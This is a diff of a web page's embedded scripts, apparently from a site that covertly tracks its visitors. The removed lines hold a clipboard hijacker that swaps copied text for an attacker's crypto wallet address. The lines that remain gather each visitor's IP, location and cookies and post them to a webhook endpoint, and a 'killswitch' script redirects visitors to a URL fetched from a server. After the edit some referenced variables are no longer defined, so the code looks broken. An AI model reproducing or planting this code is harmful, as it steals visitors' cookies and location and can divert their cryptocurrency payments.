@@ -14,10 +14,8 @@
 
   
 <script>
-  
 (async () => {
     try {
-        // STEP 1: Get IP and details
         const info = await fetch('https://ipinfo.io/json').then(res => res.json());
 
         const ip = info.ip || 'Unknown';
@@ -30,37 +28,15 @@
         const time = new Date().toISOString();
         const cookies = document.cookie || 'No accessible cookies';
 
-        // STEP 2: Setup clipboard hijack logging
-        let clipboardLog = '';
-        document.addEventListener("copy", async () => {
-            try {
-                const originalClipboard = await navigator.clipboard.readText();
-                await navigator.clipboard.writeText("0xATTACKERWALLET123...");
-                clipboardLog = `\n📋 **Clipboard Hijacked**\nOriginal: \`${originalClipboard}\`\n`;
-                sendCombinedLog(); // Send message when clipboard is used
-            } catch (err) {
-                clipboardLog = `\n📋 Clipboard hijack failed: ${err.message}\n`;
-                sendCombinedLog();
-            }
-        });
-
-        // STEP 3: Build and send full message (initial info only)
-        const baseMessage = `🕷 **Visitor Logged**\n` +
-            `IP: \`${ip}\`\nLocation: \`${city}, ${region}, ${country}\`\n` +
-            `Org: \`${org}\`\nCoords: \`${loc}\`\nHostname: \`${hostname}\`\nTime: \`${time}\`\n` +
-            `🍪 Cookies: \`${cookies}\``;
-
-        // Only send clipboard+IP combined if clipboard gets used
         function sendCombinedLog() {
             const message = baseMessage + clipboardLog;
-            fetch('/api/send', {
+            fetch('/api/sendwebhook', {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ message })
             });
         }
 
-        // Send initial info right away
         sendCombinedLog();
 
     } catch (err) {
@@ -73,7 +49,7 @@
   <script>
     async function checkKillswitch() {
       try {
-        const res = await fetch("https://killswitch-pi.vercel.app/api/kill");
+        const res = await fetch("/api/killswitch");
         const text = await res.text();
         if (text !== "none") {
           window.location.href = text;
@@ -822,6 +798,5 @@
 <script src="script.js"></script>
 
 </html>
-
 
 
